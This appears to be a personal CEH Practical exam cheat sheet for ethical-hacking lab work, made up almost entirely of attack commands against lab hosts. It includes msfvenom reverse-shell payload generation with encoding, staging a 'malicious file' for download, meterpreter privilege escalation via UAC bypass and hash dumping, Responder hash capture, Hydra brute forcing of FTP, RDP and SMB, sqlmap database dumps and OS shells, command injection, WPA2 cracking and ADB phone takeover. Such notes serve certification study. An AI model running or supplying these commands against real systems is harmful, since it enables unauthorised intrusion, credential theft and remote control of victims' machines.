# YouTube

1. Passive Reconnaissance:
Gathering information without interacting with the target directly.

whois: to find domain ownership.
theHarvester: to gather emails, subdomains, and IPs.
Google Dorking: Use search queries like site:<target-domain> filetype:pdf.

https://www.whois.com/whois/

theHarvester cmd:
> theHarvester -d example.com -b all 
-d = domain
-b = Search engine all or u can assign
-l = limit 

> theHarvester -d example.com -l 10 -b bing


FootPrinting:

>> Gather information FTP Search Engines

https://www.searchftps.net
https://www.freewareweb.com


>> IOT Search engines

https://www.shodan.io/
https://censys.io/

>> Finding Domains and Sub-domains

https://www.netcraft.com
https://pentest-tools.com
and Sublis3r

>> Gather Personal info of people

https://www.peekyou.com
https://www.spokeo.com

>> Gather Email list

theHarvester tool

>> Finding OS via Passive footprinting

https://censys.io/

>>Information from Social Networking 

Sherlock tools
-> sherlock "satya nadella"
https://www.social-searcher.com

>> Information about Site using Ping CMD

-> ping domain_name
-> ping domain_name -f -l 1500
Here, -f: Specifies setting not fragmenting flag in packet, -l: Specifies buffer size.

>> Information gather using Photon

-> python3 photon.py -h
-> python3 photon.py -u http://www.certifiedhacker.com -l 3 -t 200 --wayback
-u: specifies the target website (here, www.certifiedhacker.com)-l: specifies level to crawl (here, 3)-t: specifies number of threads (here, 200)--wayback: specifes using URLs from archive.org as seeds.

>> Gathering info of site

https://centralops.net

>> Extract company's Data 

Web Data Extractor tool

>> Gather a Wordlist

-> cewl -d 2 -m 5 https://www.certifiedhacker.com
-d represents the depth to spider the website (here, 2) and -m represents minimum word length.


>> Gather Info eMailTrackerPro tools

>> Domain Tools

http://whois.domaintools.com
https://www.tamos.com


""::Footprinting using Netcat and Telnet::""

-> nc -vv www.moviescope.com 80
>GET / HTTP/1.0

->telnet www.moviescope.com 80
>GET / HTTP/1.0


::Enumeration Nmap::

-> nmap -sV --script=http-enum [target website]
-> nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com
-> nmap --script http-trace -d www.goodshopping.com
-> nmap -p80 --script http-waf-detect www.goodshopping.com





>> Network Range
https://www.arin.net/about/welcome/region

>> Network Tracerouting 
Win: -> tracert www.certifiedhacker.com 
lin  -> traceroute www.certifiedhacker.com

>> Footprinting using BillCipher for DNS Lookup and GeoIP Lookup etc.

-> python3 billcipher.py



""::Scanning Network::""

>> Host Discovery

Nmap:
->nmap -sn -PR Target IP Address

	OR

Angry IP Scanner tools

>> Port and Service Discovery

MegaPing tool
Zenmap tool
Nmap tool

>> Os Discovery

-> nmap --script smb-os-discovery.nse [Target IP Address]

Network Scanning:

-> nmap -Pn -sS -A -oX Test 10.10.1.0/24


""::Enumeration::""

::Enumeration NetBIOS::

win: -> nbtstat -a [IP address of the remote machine] 
-> nmap -sV -v --script nbstat.nse [Target IP Address]
-> nmap -sU -p 137 --script nbstat.nse [Target IP Address]
-> nmap -T4 --script=smb-os-discovery [Target IP Address]


::Enumeration FQDN::

-> nmap -T4 --script=smb-os-discovery [Target IP Address]


::Enumeration SNMP::

-> nmap -sU -p 161 [Target IP address]
-> snmp-check [Target IP Address]
-> snmpwalk -v1 -c public [target IP]
Here: –v: specifies the SNMP version number (1 or 2c or 3) and –c: sets a community string.

-> nmap -sU -p 161 --script=snmp-sysdescr [target IP Address]
-> nmap -sU -p 161 --script=snmp-processes [target IP Address]
-> nmap -sU -p 161 --script=snmp-win32-software [target IP Address]
-> nmap -sU -p 161 --script=snmp-interfaces [target IP Address] 


::Enumeration LDAP::

Active Directory Explorer (AD Explorer)
-> nmap -sU -p 389 [Target IP address] 
-> nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' [Target IP Address]
-> ldapsearch -h [Target IP Address] -x -s base namingcontexts
-> ldapsearch -h [Target IP Address] -x -b “DC=CEH,DC=com” 
-> nmap -T4 -A [Target IP Address]
DNS Computer Name of the Domain Controller 


-> nmap --script smb-os-discovery -p 445 DC_IP


-> ldapsearch -x -h IP -b "DC=CEHORG,DC=com" "objectclass=user" enm
Domain Controller machine and the latest version of the LDAP protocol.



::Enumeration NFS::

-> nmap -p 2049 [Target IP Address]
-> cd SuperEnum tool
-> python3 rpc-scan.py [Target IP address] --rpc


::Enumeration DNS::

-> dig ns [Target Domain]
Win -> dig @[[NameServer]] [[Target Domain]] axfr 
	In this command, axfr retrieves zone information.

-> nslookup
 > type set querytype=soa,
 > Doman_name
 
Dnsrecon
-> cd dnsrecon
-> ./dnsrecon.py -d [Target domain] -z

-> nmap --script=broadcast-dns-service-discovery [Target Domain]
-> nmap -T4 -p 53 --script dns-brute [Target Domain]
-> nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='[Target Domain]'”


::Enumeration SMTP::

-> nmap -p 25 --script=smtp-enum-users [Target IP Address]
-> nmap -p 25 --script=smtp-open-relay [Target IP Address]
-> nmap -p 25 --script=smtp-commands [Target IP Address]


::Enumeration on RPC SMB FTP::

-> nmap -p 21 [Target IP Address]
-> nmap -T4 -A [Target IP Address]
-> nmap -p 445 -A [Target IP Address]
-> nmap -p [Target Port] -A [Target IP Address]


::Enumeration on NetBIOS::

-> enum4linux -u martin -p apple -U [Target IP Address]
In this command, -u user specifies the username to use, -p pass specifies the password and -U retrieves the userlist.

-> num4linux -u martin -p apple -n [Target IP Address]
For NetBIOS

-> enum4linux -u martin -p apple -o [Target IP Address]
-o retrieves the OS information

-> enum4linux -u martin -p apple -G [Target IP Address] 
 -G retrieves group and member list.


::Vulnerabilty Scaning::

OpenVAS
-> gvm-start
	OR
Pentesting --> Vulnerability Analysis --> Openvas - Greenbone --> Start Greenbone Vulnerability 
https://127.0.0.1:9392
Scan->Taskbar-> Task Wizard

-> nikto -h (Target Website) -Cgidirs all
-Cgidirs: scans the specified CGI directories; users can use filters such as “none” or “all” to scan all CGI directories or none
-> nikto -h (Target Website) -o (File_Name) F txt
-o output file F format

-> sudo responder -I eth0
Responder starts capturing the access logs of the Windows 11 machine. It collects the hashes of the logged-in user of the target machine.



Store the Hash in one file and give it to John
-> john hash.txt --format=NT >> NTLM hash

-> john --format=Raw-MD5 --wordlist=rockyou.txt hash.txt 


https://www.exploit-db.com/
SEARCH EDB

Payload Creation:
-> msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Payload.exe
->  msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe


File Sharing:
- Type **mkdir /var/www/html/share** and press **Enter** to create a shared folder
- Type **chmod -R 755 /var/www/html/share** and press **Enter**
- Type **chown -R www-data:www-data /var/www/html/share** and press **Enter**
- Copy the malicious file to the shared location by typing **cp /home/attacker/Desktop/Test.exe /var/www/html/share** and pressing **Enter**

-> msfconsole 
-> set payload windows/meterpreter/reverse_tcp
-> exploit -j -z
-> sessions -i 1
-> getuid 
-> shell

In an active meterpreter session. Type
-> upload /home/attacker/Desktop/BeRoot/beRoot.exe
-> beRoot.exe 
-> exit

meterpreter -> run post/windows/gather/smart_hashdump

meterpreter -> getsystem -t 1
Uses the service – Named Pipe Impersonation (In Memory/Admin) Technique.
meterpreter -> background
-> use exploit/windows/local/bypassuac_fodhelper
-> show options 
-> set SESSION 1 
-> set payload windows/meterpreter/reverse_tcp and press Enter. This will set the meterpreter/reverse_tcp
-> set LHOST IP
-> set TARGET 0
-> exploit 
meterpreter -> getsystem -t 1
meterpreter -> run post/windows/gather/smart_hashdump


""::Hydra FTP::""

-> hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 11]
->  ftp [IP Address of Windows 11]


::WPScan::

->wpscan --api-token [API Token] --url http://10.10.1.22:8080/CEH --enumerate u


::OS Command::
-> | dir C:\
-> | net user


""::SQL injection::""

-> blah' or 1=1 --

>>Dump
1. Copy document.cookie
2. sqlmap -u "http://site.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied]" --dbs
3. sqlmap -u "http://site.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied]" -D database_name --tables
4. sqlmap -u "http://site.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied]" -D database_name -T User_Login --dump


-> sqlmap -u "http://site.com/search.php?q=test" --cookie="PHPSESSID=your_ 
session_id" -D database_name -T users --columns 

-> sqlmap -u "http://site.com/search.php?q=test" --cookie="PHPSESSID=your_ 
session_id" -D database_name -T users -C username,password --dump


>>Shell
-> sqlmap -u "http://site/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied]" --os-shell 


>> dump
-> sqlmap -u "http://ip" --crawl=3 --level=5 --risk=3 --dbs 
-> sqlmap -u "http://ip" --crawl=3 --level=5 --risk=3 -D database_name - -tables 
-> sqlmap -u "http://ip" --crawl=3 --level=5 --risk=3 -D database_name -T table_name --columns
-> sqlmap -u "http://ip" --crawl=3 --level=5 --risk=3 -D database_name -T table_name -C Flag --dump



""::Malware Analysis::""

For POS 
Use String Searching tools "BinTest"



""::Stegnography::""

-> snow -C -p "magic" readme2.txt
For WhiteSpace hidden. magic is password.


>> Copy the confi.txt file and snow folder on the Desktop and open CMD.
--> snow.exe -C confi.txt 


Use OpenStego for decrypt

StegOnline: 
https://stegonline.georgeom.net/upload


""::Wireshark::""
filter to find bit by bit msg
--> ip.addr == IP

For IOT
--> mqtt
MQ Telementry  



""::Privilege::""

SSH vuln. connect
-> ssh user@ip -p port
-> sudo -l
-> sudo -u user2 /bin/bash



Hydra FTP Brute force
--> hyda -L Username.txt -P Passwords.txt 172.*** ftp
--> ftp 172.***  >> for login Enter Username and Password


--> wpscan --url http://site.com/wp-login.php -U ./username.txt -P ./password.txt



WIFi

-> airodump-ng .cap > to identify BSSid and channel
-> airodump-ng --bssid BSSID --channel CHANNEL -w outputfile  .cap
-> aircrack-ng -w /path/to/wordlist.txt outputfile.cap 



WEP
->aircrack-ng '/home/attacker/Desktop/Sample Captures/WEPcrack-01.cap'

WPA2
-> aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'


RDP
From nmap identify ip and port
brute force credential
-> hydra -t 1 -V -f -l jones -P /home/passlist.txt rdp://ip



ADB
use GitHub Phonesploit
-> python3 phonesploit.py
-> 3 Try again if not work
-> If asked then enter the IP
-> 4 for Shell access
-> cd / 
-> cd sdcard search for flag img and then 
-> pwd for file location
-> 9 for pulling img
-> location of img 
-> where you want to save
Transfer to windows for decrypting using python server


SMB
find ip using NMAP
-> smbclient -L \\IP  >> for sharename
-> hydra -L userlist.txt -p passlist.txt ip smb
-> smbclient \\\\ip\\sharename -U user
type txt





FILE search
-> find / -name Flag.txt 2>/dev/null 



https://github.com/Adityaraj6/CEH-CheatSheet
https://github.com/System-CTL/CEH_CHEAT_SHEET
https://medium.com/@faizan1999/my-exam-notes-ceh-practical-2-4625349feaf7
https://medium.com/cyversity/ceh-practical-my-exam-review-68663e7376b4
https://github.com/infovault-Ytube/CEH-Practical-Notes/
https://www.stationx.net/how-to-use-hashcat/
https://github.com/cmuppin/CEH/blob/main/SQL%20Injection
https://mattw.io/youtube-metadata/
https://ceh-practical.cavementech.com/
https://github.com/Indrajith-S/CEH-Lab-Notes
https://github.com/pcasaspere/ceh_practical_v12
https://github.com/TheCyberpunker/CEH-Practical-Notes
https://github.com/Samsar4/Ethical-Hacking-Labs
https://github.com/hunterxxx/CEH-v12-Practical
https://github.com/dhabaleshwar/CEHPractical/blob/main/Everything%20You%20Need.md
https://medium.com/techiepedia/certified-ethical-hacker-practical-exam-guide-dce1f4f216c9
https://chirag-singla.notion.site/CEH-Practical-Preparation-7f2b77651cd144e8872f2f5a30155052
https://vikaschahal01.medium.com/how-i-cracked-ceh-practical-with-18-20-score-a43bd6c975f7








https://drive.google.com/file/d/11UzVivxks67vN9UADKoAcPBuCVQe7yFa/view?usp=sharing
Practical CEH
